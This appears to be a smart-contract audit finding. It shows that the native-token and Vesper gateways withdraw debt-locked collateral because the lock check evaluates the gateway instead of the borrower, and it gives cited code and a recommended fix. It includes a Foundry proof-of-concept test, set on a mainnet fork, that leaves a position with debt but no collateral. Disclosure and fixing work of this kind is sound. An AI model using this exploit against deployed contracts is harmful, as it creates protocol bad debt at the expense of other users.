### Title
Gateway withdrawals bypass collateral locking by changing the account evaluated for debt - ([File: contracts/NativeTokenGateway.sol](contracts/NativeTokenGateway.sol))

### Summary

`NativeTokenGateway.withdraw()` lets a borrower withdraw collateral that should remain locked against outstanding debt. It first transfers the user's `DepositToken` shares to the gateway and then calls `DepositToken.withdraw()`, causing the lock check to evaluate the debt-free gateway rather than the original borrower. [1](#0-0) [2](#0-1) 

### Finding Description

`DepositToken.withdraw()` calls `_revertIfLocked(_msgSender(), amount_)`. When invoked through `NativeTokenGateway`, `_msgSender()` is the gateway, not the user whose collateral backs the debt position. [3](#0-2) 

The gateway first pulls the user's deposit shares with `transferFrom()` and then calls `withdraw()` on those transferred shares. Because the gateway has no debt, `unlockedBalanceOf(gateway)` returns its full balance, so the user's locked collateral is withdrawn and sent to the user as native ETH. [4](#0-3) [5](#0-4) 

`VesperGateway.withdraw()` has the same flaw: it transfers the user's deposit shares to itself, withdraws as the debt-free gateway, unwraps the Vesper position, and returns the underlying collateral. [6](#0-5) 

### Impact Explanation

A borrower can issue the maximum debt supported by collateral and then withdraw all collateral through the gateway. The position is left with debt but no backing collateral, directly breaking the solvency invariant and creating protocol bad debt without requiring privileged access, oracle corruption, governance action, or a malicious external endpoint. [7](#0-6) [8](#0-7) 

### Likelihood Explanation

Any user with an overcollateralized position can execute the attack using only public functions and their own assets. `NativeTokenGateway.withdraw()` requires only prior approval for the deposit token; `VesperGateway.withdraw()` has the same requirement. No modifier or check revalidates the original owner's health after transferring shares to the gateway. [9](#0-8) [10](#0-9) 

### Recommendation

Do not transfer ownership of the shares to the gateway before withdrawal. Add or expose an explicit withdrawal path that records the original account, checks `_revertIfLocked(originalAccount, amount_)`, burns that account's shares, and only then lets the gateway unwrap and forward the underlying asset. The existing `withdrawFrom(from_, amount_)` already implements the correct lock check, but it is currently restricted to `SmartFarmingManager`; gateway authorization or a dedicated gateway-facing function should preserve that account check. [11](#0-10) [12](#0-11) 

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test} from "forge-std/Test.sol";

interface IWETH {
    function balanceOf(address) external view returns (uint256);
}

interface INativeGateway {
    function nativeToken() external view returns (IWETH);
    function deposit(address pool) external payable;
    function withdraw(address pool, uint256 amount) external;
}

interface IDepositToken {
    function balanceOf(address) external view returns (uint256);
    function unlockedBalanceOf(address) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function withdraw(uint256 amount, address to) external;
}

interface IMasterOracle {
    function quoteUsdToToken(address token, uint256 usdAmount)
        external
        view
        returns (uint256);
}

interface IDebtToken {
    function issue(uint256 amount, address to) external;
    function syntheticToken() external view returns (address);
}

interface IPool {
    function depositTokenOf(address underlying)
        external
        view
        returns (IDepositToken);

    function masterOracle() external view returns (IMasterOracle);

    function debtPositionOf(address account)
        external
        view
        returns (
            bool healthy,
            uint256 depositUsd,
            uint256 debtUsd,
            uint256 issuableLimitUsd,
            uint256 issuableUsd
        );
}

contract GatewayLockedCollateralBypass is Test {
    function testWithdrawLockedNativeCollateral() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"));

        address user = makeAddr("borrower");
        IPool pool = IPool(vm.envAddress("METRONOME_POOL"));
        INativeGateway gateway =
            INativeGateway(vm.envAddress("NATIVE_TOKEN_GATEWAY"));
        IDebtToken debtToken = IDebtToken(vm.envAddress("DEBT_TOKEN"));

        uint256 collateralAmount = 100 ether;
        vm.deal(user, collateralAmount);

        vm.startPrank(user);

        // Deposit native collateral through the gateway.
        gateway.deposit{value: collateralAmount}(address(pool));

        IDepositToken depositToken =
            pool.depositTokenOf(address(gateway.nativeToken()));
        uint256 shares = depositToken.balanceOf(user);
        assertGt(shares, 0);

        // Issue the maximum supported debt.
        (, , , , uint256 issuableUsd) = pool.debtPositionOf(user);
        uint256 maxDebt = pool.masterOracle().quoteUsdToToken(
            debtToken.syntheticToken(),
            issuableUsd
        );
        debtToken.issue(maxDebt, user);

        // A direct withdrawal of all shares is correctly blocked.
        assertLt(depositToken.unlockedBalanceOf(user), shares);
        vm.expectRevert();
        depositToken.withdraw(shares, user);

        // Gateway withdrawal evaluates the gateway's debt-free position instead.
        depositToken.approve(address(gateway), shares);
        gateway.withdraw(address(pool), shares);

        vm.stopPrank();

        // The user retains debt but no longer has collateral shares.
        (bool healthy, , uint256 debtUsd, , ) = pool.debtPositionOf(user);
        assertFalse(healthy);
        assertGt(debtUsd, 0);
        assertEq(depositToken.balanceOf(user), 0);
        assertGt(user.balance, 0);
    }
}
```

### Citations

**File:** contracts/NativeTokenGateway.sol (L61-70)
```text
    function withdraw(IPool pool_, uint256 amount_) external override nonReentrant {
        if (!_poolRegistry.isPoolRegistered(address(pool_))) revert UnregisteredPool();

        address _msgSender = _msgSender();
        IDepositToken _depositToken = pool_.depositTokenOf(nativeToken);
        _depositToken.safeTransferFrom(_msgSender, address(this), amount_);
        (uint256 _withdrawn, ) = _depositToken.withdraw(amount_, address(this));
        nativeToken.withdraw(_withdrawn);
        Address.sendValue(payable(_msgSender), _withdrawn);
    }
```

**File:** contracts/DepositToken.sol (L383-397)
```text
    function unlockedBalanceOf(address account_) public view override returns (uint256 _unlockedBalance) {
        IPool _pool = pool;

        (, , uint256 _debtInUsd, , uint256 _issuableInUsd) = _pool.debtPositionOf(account_);

        if (_debtInUsd == 0) {
            return balanceOf[account_];
        }

        if (_issuableInUsd > 0) {
            _unlockedBalance = Math.min(
                balanceOf[account_],
                _pool.masterOracle().quoteUsdToToken(address(underlying), _issuableInUsd.wadDiv(collateralFactor))
            );
        }
```

**File:** contracts/DepositToken.sol (L406-411)
```text
    function withdraw(uint256 amount_, address to_) external override returns (uint256 _withdrawn, uint256 _fee) {
        if (to_ == address(0)) revert RecipientIsNull();
        address _msgSender = _msgSender();
        _revertIfLocked(_msgSender, amount_);

        return _withdraw({account_: _msgSender, amount_: amount_, to_: to_});
```

**File:** contracts/DepositToken.sol (L420-427)
```text
    function withdrawFrom(
        address from_,
        uint256 amount_
    ) external override onlyIfSmartFarmingManager returns (uint256 _withdrawn, uint256 _fee) {
        _revertIfLocked(from_, amount_);

        return _withdraw({account_: from_, amount_: amount_, to_: _msgSender()});
    }
```

**File:** contracts/DepositToken.sol (L536-553)
```text
    function _withdraw(
        address account_,
        uint256 amount_,
        address to_
    ) private whenNotShutdown nonReentrant onlyIfDepositTokenExists returns (uint256 _withdrawn, uint256 _fee) {
        if (amount_ == 0) revert AmountIsZero();

        IPool _pool = pool;

        (_withdrawn, _fee) = quoteWithdrawOut(amount_);
        if (_fee > 0) {
            _transfer(account_, _pool.feeCollector(), _fee);
        }

        _burn(account_, _withdrawn);
        _pool.treasury().pull(to_, _withdrawn);

        emit CollateralWithdrawn(account_, to_, amount_, _withdrawn, _fee);
```

**File:** contracts/VesperGateway.sol (L73-92)
```text
    function withdraw(IPool pool_, IVPool vToken_, uint256 amount_) external override nonReentrant {
        if (!_poolRegistry.isPoolRegistered(address(pool_))) revert UnregisteredPool();

        address _msgSender = _msgSender();

        // 1. Get `msdTokens`
        IDepositToken _depositToken = pool_.depositTokenOf(vToken_);
        _depositToken.safeTransferFrom(_msgSender, address(this), amount_);

        // 2. Withdraw `vTokens` from `Synth`
        (uint256 _vTokenAmount, ) = _depositToken.withdraw(amount_, address(this));

        // 3. Withdraw `underlying` from `VPool`
        IERC20 _underlying = IERC20(vToken_.token());
        uint256 _balanceBefore = _underlying.balanceOf(address(this));
        vToken_.withdraw(_vTokenAmount);
        uint256 _underlyingAmount = _underlying.balanceOf(address(this)) - _balanceBefore;

        // 4. Transfer `underlying` to the `_msgSender()`
        _underlying.safeTransfer(_msgSender, _underlyingAmount);
```

**File:** contracts/Pool.sol (L248-265)
```text
    function debtPositionOf(
        address account_
    )
        public
        view
        override
        returns (
            bool _isHealthy,
            uint256 _depositInUsd,
            uint256 _debtInUsd,
            uint256 _issuableLimitInUsd,
            uint256 _issuableInUsd
        )
    {
        _debtInUsd = debtOf(account_);
        (_depositInUsd, _issuableLimitInUsd) = depositOf(account_);
        _isHealthy = _debtInUsd <= _issuableLimitInUsd;
        _issuableInUsd = _debtInUsd < _issuableLimitInUsd ? _issuableLimitInUsd - _debtInUsd : 0;
```

**File:** contracts/Pool.sol (L274-287)
```text
    function depositOf(
        address account_
    ) public view override returns (uint256 _depositInUsd, uint256 _issuableLimitInUsd) {
        IMasterOracle _masterOracle = masterOracle();
        uint256 _length = depositTokensOfAccount.length(account_);
        for (uint256 i; i < _length; ++i) {
            IDepositToken _depositToken = IDepositToken(depositTokensOfAccount.at(account_, i));
            uint256 _amountInUsd = _masterOracle.quoteTokenToUsd(
                address(_depositToken.underlying()),
                _depositToken.balanceOf(account_)
            );
            _depositInUsd += _amountInUsd;
            _issuableLimitInUsd += _amountInUsd.wadMul(_depositToken.collateralFactor());
        }
```
